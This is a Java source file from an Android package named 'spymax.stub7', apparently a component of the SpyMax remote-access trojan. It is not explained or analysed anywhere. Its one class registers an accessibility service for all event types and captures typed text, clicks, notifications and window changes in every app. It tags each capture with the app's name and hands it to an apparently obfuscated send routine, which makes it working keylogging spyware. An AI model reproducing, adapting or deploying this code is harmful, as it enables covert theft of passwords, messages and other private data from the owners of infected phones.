package spymax.stub7;
import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.view.accessibility.AccessibilityEvent;
import java.util.List;
public class ClassGen12 extends AccessibilityService {
    private String getEventText(AccessibilityEvent event) {
        List<CharSequence> text = event.getText();
        return text.toString();
    }
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            if(ClassGen11.k){
                final int eventType = event.getEventType();
                switch(eventType) {
                    case AccessibilityEvent.TYPE_VIEW_CLICKED:
                        s(event,0);
                        break;
                    case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                        s(event,1);
                        break;
                    case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                        s(event,2);
                        break;
                    case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                        s(event,3);
                        break;
                    case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED  :
                        s(event,4);
                        break;
                    case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED  :
                        s(event,5);
                        break;
                }
            }
        } catch (Exception e) {}
    }
    public void s(AccessibilityEvent event , int f){
        String s = getEventText(event);
        String p = (String) event.getPackageName();
        PackageManager pk = getApplicationContext().getPackageManager();
        ApplicationInfo fo ;
        try {
            fo = pk.getApplicationInfo(p, 0);
        } catch (final PackageManager.NameNotFoundException e) {
            fo = null;
        }
        String n = (String) (fo != null ? pk.getApplicationLabel(fo ) : ClassGen11.cmn[3]);
        ClassGen2.se(ClassGen11.cmn[1] + ClassGen11.cmn[2] + n + ClassGen11.cmn[2] + s + ClassGen11.cmn[2] + String.valueOf(f),"\t".getBytes());
    }
    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        try {
            AccessibilityServiceInfo f = new AccessibilityServiceInfo();
            f.flags = AccessibilityServiceInfo.DEFAULT |
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                    AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY |
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS ;

            f.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
            f.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
            setServiceInfo(f);
        } catch (Exception e) {}
    }
    @Override
    public void onInterrupt() {}
}
